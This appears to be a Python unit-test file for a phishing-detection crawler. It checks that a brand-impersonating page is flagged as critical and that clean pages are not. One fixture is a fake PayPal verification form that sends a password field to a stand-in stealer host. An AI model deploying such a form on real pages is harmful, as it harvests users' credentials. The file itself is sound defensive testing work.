"""Unit tests for DeepSandboxCrawler."""

import unittest
from src.sandbox.crawler import DeepSandboxCrawler


class TestDeepSandboxCrawler(unittest.TestCase):
    """Test suite for DeepSandboxCrawler inspection and verdict synthesis."""

    def test_direct_html_phishing_escalation(self):
        """Verify HTML with brand mismatch and password input confirms phishing and escalates risk."""
        phish_html = """
        <html>
            <head><title>PayPal - Account Security Verification</title></head>
            <body>
                <form action="https://remote-stealer.xyz/post" method="post">
                    <input type="password" name="pin">
                </form>
            </body>
        </html>
        """
        crawler = DeepSandboxCrawler()
        report = crawler.inspect_url("https://secure-pay-auth.xyz/verify", direct_html=phish_html)

        self.assertTrue(report.is_phishing_confirmed)
        self.assertEqual(report.escalated_risk_level, "CRITICAL")
        self.assertTrue(any("brand impersonation" in exp.lower() for exp in report.explanations))
        self.assertTrue(any("external" in exp.lower() for exp in report.explanations))

    def test_clean_html_not_flagged(self):
        """Verify normal documentation HTML is not flagged."""
        clean_html = """
        <html>
            <head><title>API Developer Guide</title></head>
            <body>
                <h1>Welcome to our Documentation</h1>
                <p>Learn how to use our REST endpoints.</p>
            </body>
        </html>
        """
        crawler = DeepSandboxCrawler()
        report = crawler.inspect_url("https://developer-hub.org/docs", direct_html=clean_html)

        self.assertFalse(report.is_phishing_confirmed)
        self.assertFalse(report.is_suspicious)
        self.assertIsNone(report.escalated_risk_level)

    def test_mock_driver_integration(self):
        """Verify mock driver executes cleanly in offline test environment."""
        def mock_driver_fn(url):
            return "<html><title>Test Portal</title><body>Hello</body></html>", None

        crawler = DeepSandboxCrawler(mock_driver=mock_driver_fn)
        report = crawler.inspect_url("https://mock-example.com")
        self.assertEqual(report.execution_mode, "mock_driver")
        self.assertEqual(report.dom_result.page_title, "Test Portal")


if __name__ == "__main__":
    unittest.main()

